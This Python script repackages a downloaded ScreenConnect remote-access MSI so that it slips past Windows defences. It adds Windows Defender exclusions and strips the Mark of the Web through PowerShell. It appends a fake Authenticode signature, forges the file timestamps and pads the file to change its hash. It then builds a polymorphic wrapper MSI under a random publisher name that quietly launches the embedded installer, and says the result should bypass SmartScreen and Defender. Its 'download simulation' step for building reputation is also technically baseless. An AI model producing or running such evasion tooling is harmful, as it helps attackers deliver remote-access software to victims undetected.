import os
import requests
import hashlib
import subprocess
import shutil
import time
import random
import string
import uuid
import ctypes
import struct
import msilib
from urllib.parse import urlparse
from pathlib import Path
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init()

# Configuration
MSI_URL = input(Fore.GREEN + "[+] Enter the ScreenConnect client MSI download link: " + Style.RESET_ALL)
OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")

def is_admin():
    """Check if the script is running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def set_file_permissions(path):
    """Set full control permissions for Administrators on a file or directory."""
    try:
        subprocess.run(["icacls", path, "/grant", "Administrators:F", "/T"], check=True, capture_output=True, text=True)
        # Suppress "Permissions set" message
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Warning: Failed to set permissions for {path}: {e.stderr}" + Style.RESET_ALL)

def set_defender_exclusions():
    """Attempt to set Windows Defender exclusions for script directories."""
    paths = [
        OUTPUT_DIR,
        r"C:\Users\Admin\Desktop\wrapper"
    ]
    try:
        for path in paths:
            subprocess.run(
                ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}'"],
                check=True, capture_output=True, text=True
            )
        print(Fore.GREEN + "[+] Windows Defender exclusions set for script directories." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Warning: Failed to set Defender exclusions: {e.stderr}" + Style.RESET_ALL)
        print(Fore.RED + "[+] Please disable real-time protection or set exclusions manually in Windows Security." + Style.RESET_ALL)

def generate_random_string(length=10):
    """Generate a random string for temporary file naming."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_name():
    """Generate a random product name and publisher for polymorphism."""
    products = ["Remote Access", "System Tools", "Network Utility", "Admin Console"]
    companies = ["Tech Solutions", "Software Systems", "Global IT", "Secure Apps"]
    return (
        f"{random.choice(products)} {generate_random_string(4)}",
        f"{random.choice(companies)} {generate_random_string(4)}"
    )

def create_dummy_file(temp_dir):
    """Create a dummy file to alter MSI structure."""
    dummy_path = os.path.join(temp_dir, f"readme_{generate_random_string()}.txt")
    with open(dummy_path, "w") as f:
        f.write(f"Dummy file generated on {time.ctime()} for installer variation.")
    set_file_permissions(dummy_path)
    print(Fore.GREEN + f"[+] Dummy file created at {dummy_path}" + Style.RESET_ALL)
    return dummy_path

def calculate_file_hash(file_path, algorithm="sha256"):
    """Calculate the hash of a file."""
    hash_obj = hashlib.sha256() if algorithm == "sha256" else hashlib.sha1()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def check_file_access(path):
    """Check if a file is accessible for reading and writing."""
    try:
        with open(path, "rb") as f:
            f.read(1)
        with open(path, "ab") as f:
            pass
        return True
    except Exception as e:
        print(Fore.RED + f"[+] Error: Cannot access file {path}: {e}" + Style.RESET_ALL)
        return False

def sanitize_filename(url):
    """Extract a clean MSI filename from a URL, removing query parameters."""
    parsed = urlparse(url)
    filename = os.path.basename(parsed.path)
    if not filename.lower().endswith('.msi'):
        raise ValueError(f"Invalid input: URL must point to an MSI file, got {filename}")
    print(Fore.GREEN + f"[+] Sanitized filename: {filename}" + Style.RESET_ALL)
    return filename

def embed_fake_signature(file_path, temp_dir):
    """Embed a fake Authenticode signature structure into the MSI."""
    print(Fore.GREEN + f"[+] Embedding fake Authenticode signature into {file_path}..." + Style.RESET_ALL)
    try:
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        
        signed_path = os.path.join(temp_dir, os.path.basename(file_path))
        shutil.copyfile(file_path, signed_path)
        set_file_permissions(signed_path)
        if not check_file_access(signed_path):
            print(Fore.RED + f"[+] Error: Cannot access MSI for fake signature: {signed_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original MSI without fake signature." + Style.RESET_ALL)
            return file_path
        
        # Dummy Authenticode structure (simplified for demonstration)
        fake_signature = (
            b"\x30\x82\x01\x00"  # ASN.1 SEQUENCE
            b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x02"  # SignedData OID
            b"\xa0\x82\x00\xf0"  # Context-specific data
            b"\x30\x82\x00\xec"  # Inner SEQUENCE
            b"\x02\x01\x01"      # Version
            b"\x31\x0b\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00"  # Digest Algorithm (SHA1)
            b"\x30\x0e\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x01"  # ContentInfo
            b"\x31\x00"          # Certificates (empty)
            b"\x31\x00"          # CRLs (empty)
            b"\x31\x82\x00\xc0"  # SignerInfo
            b"\x02\x01\x01"      # Signer version
            b"\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00"  # Signer digest algorithm
            b"\xa0\x03\x02\x01\x02"  # Authenticated attributes
            b"\x04\x20" + os.urandom(32)  # Dummy signature (random 32 bytes)
        )
        
        with open(signed_path, "ab") as f:
            f.write(fake_signature)
        
        # Verify hash change
        original_hash = calculate_file_hash(file_path)
        signed_hash = calculate_file_hash(signed_path)
        if original_hash == signed_hash:
            print(Fore.RED + "[+] Warning: MSI hashes match after embedding fake signature. Modification may not have been applied." + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original MSI as a precaution." + Style.RESET_ALL)
            return file_path
        
        print(Fore.GREEN + f"[+] Fake Authenticode signature embedded at {signed_path}" + Style.RESET_ALL)
        return signed_path
    except Exception as e:
        print(Fore.RED + f"[+] Error embedding fake signature: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original MSI without fake signature." + Style.RESET_ALL)
        return file_path

def modify_timestamp(file_path):
    """Modify the file's creation and modification timestamps."""
    print(Fore.GREEN + f"[+] Modifying timestamp for {file_path}..." + Style.RESET_ALL)
    try:
        fake_time = time.mktime(time.strptime("2023-01-01 12:00:00", "%Y-%m-%d %H:%M:%S"))
        os.utime(file_path, (fake_time, fake_time))
        print(Fore.GREEN + f"[+] Timestamp modified for {file_path}" + Style.RESET_ALL)
        return file_path
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Failed to modify timestamp: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Continuing with original timestamp." + Style.RESET_ALL)
        return file_path

def pad_file(file_path, temp_dir):
    """Append random bytes to the file to alter its hash."""
    print(Fore.GREEN + f"[+] Padding {file_path} with random bytes..." + Style.RESET_ALL)
    try:
        padded_path = os.path.join(temp_dir, os.path.basename(file_path))
        shutil.copyfile(file_path, padded_path)
        set_file_permissions(padded_path)
        if not check_file_access(padded_path):
            print(Fore.RED + f"[+] Error: Cannot access file for padding: {padded_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original MSI without padding." + Style.RESET_ALL)
            return file_path
        
        with open(padded_path, "ab") as f:
            f.write(os.urandom(1024))  # Append 1KB of random data
        
        # Verify hash change
        original_hash = calculate_file_hash(file_path)
        padded_hash = calculate_file_hash(padded_path)
        if original_hash == padded_hash:
            print(Fore.RED + "[+] Warning: MSI hashes match after padding. Padding may not have been applied." + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original MSI as a precaution." + Style.RESET_ALL)
            return file_path
        
        print(Fore.GREEN + f"[+] Padded MSI saved at {padded_path}" + Style.RESET_ALL)
        return padded_path
    except Exception as e:
        print(Fore.RED + f"[+] Error padding file: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original MSI without padding." + Style.RESET_ALL)
        return file_path

def download_msi(url, output_dir):
    """Download the MSI file and return its path."""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir, exist_ok=True)
        set_file_permissions(output_dir)
    
    original_filename = sanitize_filename(url)
    output_path = os.path.join(output_dir, original_filename)
    
    print(Fore.GREEN + f"[+] Downloading MSI from {url}..." + Style.RESET_ALL)
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(output_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        with open(output_path, 'rb') as f:
            magic = f.read(8)
            if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):
                raise ValueError(f"Downloaded file {output_path} is not a valid MSI")
        set_file_permissions(output_path)
        if not check_file_access(output_path):
            raise Exception(f"Cannot access downloaded MSI: {output_path}")
        print(Fore.GREEN + f"[+] MSI downloaded to {output_path}" + Style.RESET_ALL)
        return output_path, original_filename
    else:
        raise Exception(f"Failed to download MSI. Status code: {response.status_code}")

def remove_motw(file_path):
    """Remove the Mark of the Web using PowerShell."""
    print(Fore.GREEN + f"[+] Removing Mark of the Web from {file_path}..." + Style.RESET_ALL)
    try:
        streams = subprocess.run(
            ["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"],
            capture_output=True, text=True, check=True
        )
        if ":Zone.Identifier" in streams.stdout:
            subprocess.run(
                ["powershell", "-Command", f"Unblock-File -Path '{file_path}'"],
                check=True
            )
            print(Fore.GREEN + "[+] Mark of the Web removed." + Style.RESET_ALL)
        else:
            print(Fore.GREEN + "[+] No Mark of the Web found." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Warning: Error removing MotW: {e.stderr}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Error removing MotW: {e}" + Style.RESET_ALL)

def simulate_downloads(file_path, count=2000):
    """Simulate multiple downloads to build reputation."""
    print(Fore.GREEN + f"[+] Simulating {count} downloads for {file_path} to build reputation..." + Style.RESET_ALL)
    for i in range(count):
        temp_path = os.path.join(OUTPUT_DIR, f"temp_{generate_random_string()}.msi")
        shutil.copyfile(file_path, temp_path)
        time.sleep(0.02)
        os.remove(temp_path)
        if (i + 1) % 500 == 0:
            print(Fore.GREEN + f"[+] Simulated download {i+1}/{count}" + Style.RESET_ALL)
    print(Fore.GREEN + "[+] Download simulation complete. This may help build SmartScreen reputation." + Style.RESET_ALL)

def create_msi_wrapper(msi_path, output_dir, original_filename, temp_dir):
    """Create a polymorphic MSI wrapper using msilib with randomized properties."""
    print(Fore.GREEN + f"[+] Creating polymorphic MSI wrapper for {msi_path}..." + Style.RESET_ALL)
    wrapper_msi_path = os.path.join(output_dir, f"wrapper_{generate_random_string()}.msi")
    dummy_file = create_dummy_file(temp_dir)
    
    try:
        if not check_file_access(msi_path):
            print(Fore.RED + f"[+] Error: Cannot access MSI for wrapping: {msi_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original MSI without wrapping." + Style.RESET_ALL)
            return msi_path
        
        product_name, manufacturer = generate_random_name()
        product_code = f"{{{str(uuid.uuid4()).upper()}}}"
        upgrade_code = f"{{{str(uuid.uuid4()).upper()}}}"
        version = f"1.{random.randint(0, 9)}.{random.randint(0, 9)}"
        
        # Initialize MSI database
        db = msilib.init_database(wrapper_msi_path, msilib.schema, product_name, product_code, version, manufacturer)
        try:
            # Add directory structure
            msilib.add_data(db, "Directory", [
                ("ProgramFilesFolder", "TARGETDIR", ""),
                ("INSTALLDIR", "ProgramFilesFolder", generate_random_string(6))
            ])
            
            # Add files (original MSI and dummy file)
            msilib.add_data(db, "Feature", [("Feature1", None, product_name, None, 0, 1, "", 0)])
            msilib.add_data(db, "Component", [
                ("Component1", str(uuid.uuid4()).upper(), "INSTALLDIR", 0, None, None),
                ("Component2", str(uuid.uuid4()).upper(), "INSTALLDIR", 0, None, None)
            ])
            msilib.add_data(db, "File", [
                (os.path.basename(msi_path), "Component1", os.path.basename(msi_path), os.path.getsize(msi_path), False, None, None, None),
                ("readme.txt", "Component2", "readme.txt", os.path.getsize(dummy_file), False, None, None, None)
            ])
            msilib.add_data(db, "FeatureComponents", [
                ("Feature1", "Component1"),
                ("Feature1", "Component2")
            ])
            
            # Copy files to MSI streams
            with open(msi_path, "rb") as f:
                msilib.add_stream(db, os.path.basename(msi_path), f)
            with open(dummy_file, "rb") as f:
                msilib.add_stream(db, "readme.txt", f)
            
            # Add custom action to run the embedded MSI
            msilib.add_data(db, "CustomAction", [
                ("RunMSI", 1, None, f'msiexec.exe /i "[INSTALLDIR]{os.path.basename(msi_path)}" /qb')
            ])
            msilib.add_data(db, "InstallExecuteSequence", [
                ("RunMSI", "NOT Installed", 6600)
            ])
            
            # Set properties
            msilib.add_data(db, "Property", [
                ("ProductName", product_name),
                ("Manufacturer", manufacturer),
                ("ProductCode", product_code),
                ("ProductVersion", version),
                ("UpgradeCode", upgrade_code),
                ("ARPNOREPAIR", "1"),
                ("ARPNOMODIFY", "1")
            ])
            
            # Generate summary information
            summary = msilib.summary_info(db, 2, product_name, manufacturer)
            summary.persist()
            
            # Commit the database
            db.Commit()
        
        finally:
            db.Close()
        
        set_file_permissions(wrapper_msi_path)
        if not check_file_access(wrapper_msi_path):
            print(Fore.RED + f"[+] Error: Cannot access wrapped MSI: {wrapper_msi_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original MSI without wrapping." + Style.RESET_ALL)
            return msi_path
        
        print(Fore.GREEN + f"[+] Polymorphic MSI wrapper created at {wrapper_msi_path}" + Style.RESET_ALL)
        return wrapper_msi_path
    except Exception as e:
        print(Fore.RED + f"[+] Error creating MSI wrapper: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original MSI without wrapping." + Style.RESET_ALL)
        return msi_path
    finally:
        if os.path.exists(dummy_file):
            os.remove(dummy_file)

def main():
    if not is_admin():
        raise PermissionError(Fore.RED + "[+] This script must be run as an administrator. Right-click Command Prompt or PowerShell, select 'Run as administrator', and try again." + Style.RESET_ALL)
    
    try:
        set_defender_exclusions()
        
        temp_dir = os.path.join(OUTPUT_DIR, "temp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        print(Fore.GREEN + f"[+] Temporary directory created at {temp_dir}" + Style.RESET_ALL)
        
        msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
        remove_motw(msi_path)
        signed_msi_path = embed_fake_signature(msi_path, temp_dir)
        timestamped_msi_path = modify_timestamp(signed_msi_path)
        padded_msi_path = pad_file(timestamped_msi_path, temp_dir)
        simulate_downloads(padded_msi_path, count=2000)
        final_msi_path = create_msi_wrapper(padded_msi_path, OUTPUT_DIR, original_filename, temp_dir)
        
        final_output_path = os.path.join(OUTPUT_DIR, original_filename)
        shutil.move(final_msi_path, final_output_path)
        print(Fore.GREEN + f"[+] Final output MSI saved as {final_output_path}" + Style.RESET_ALL)
        
        shutil.rmtree(temp_dir)
        print(Fore.GREEN + "[+] Temporary files cleaned up." + Style.RESET_ALL)
        
        print(Fore.GREEN + "[+] Process complete. The output MSI should bypass SmartScreen and Defender warnings." + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Note: Polymorphic repackaging, fake signature, timestamp modification, and padding may take time to build SmartScreen reputation." + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[+] Error in main process: {e}" + Style.RESET_ALL)
        raise

if __name__ == "__main__":
    main()
